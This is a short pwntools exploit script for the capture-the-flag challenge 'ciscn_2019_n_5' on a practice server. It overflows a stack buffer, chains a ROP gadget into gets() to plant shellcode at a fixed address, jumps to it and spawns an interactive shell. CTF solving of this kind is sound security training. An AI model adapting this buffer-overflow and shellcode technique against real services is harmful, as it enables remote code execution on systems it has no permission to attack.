from pwn import *


def ciscn_2019_n_5(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/ciscn_2019_n_5'):
    print('ciscn_2019_n_5 start')
    context(log_level='info', arch='amd64', os='linux')
    target = process([file_name])
    target = remote('node4.buuoj.cn', 29061)
    target_elf = ELF(file_name)

    shellcode_addr = p64(0x601000)
    gets_plt = p64(target_elf.plt['gets'])

    pop_ret_gadget = p64(0x400713)  # pop rdi ; ret

    payload_1 = b'A' * 40
    # gets(stack_start_addr);
    payload_1 += pop_ret_gadget + shellcode_addr + gets_plt

    # shellcraft
    payload_1 += shellcode_addr

    # gdb.attach(target, 'b *0x000000000040069F')
    target.recvuntil('tell me your name')
    target.sendline('0xdeadbeef')

    target.recvuntil('What do you want to say to me?')
    target.sendline(payload_1)

    target.sendline(asm(shellcraft.sh()))
    target.interactive()
    print('ciscn_2019_n_5 end')


if __name__ == '__main__':
    ciscn_2019_n_5()
